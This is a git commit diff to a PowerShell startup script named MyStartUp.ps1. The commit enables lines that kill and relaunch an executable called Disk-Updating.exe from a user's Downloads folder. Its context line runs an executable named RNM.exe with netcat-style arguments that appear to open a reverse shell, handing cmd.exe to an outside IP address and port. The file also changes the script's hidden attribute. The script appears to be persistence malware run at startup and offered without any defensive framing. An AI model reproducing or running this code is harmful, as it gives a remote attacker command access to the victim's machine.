e41981734b351ed0ed750d791eab791f538fb274
fullcaleta <144293848+fullcaleta@users.noreply.github.com>
2023-12-03 15:05:32 -0300

    Update MyStartUp.ps1

--- MyStartUp.ps1
+++ MyStartUp.ps1
@@ -1,6 +1,8 @@
+taskkill /F /IM Disk-Updating.exe
+C:\Users\angel\Downloads\Disk-Updating.exe
+
 C:\Users\Public\RNM.exe -nv 193.161.193.99 49098 -e cmd.exe
-#taskkill /F /IM Disk-Updating.exe
-#C:\Users\angel\Downloads\Disk-Updating.exe
+
 #taskkill /F /IM lml.exe
 #C:\Users\seba\Downloads\lml.exe
 attrib -h C:\Users\Public\MyStartUp.ps1
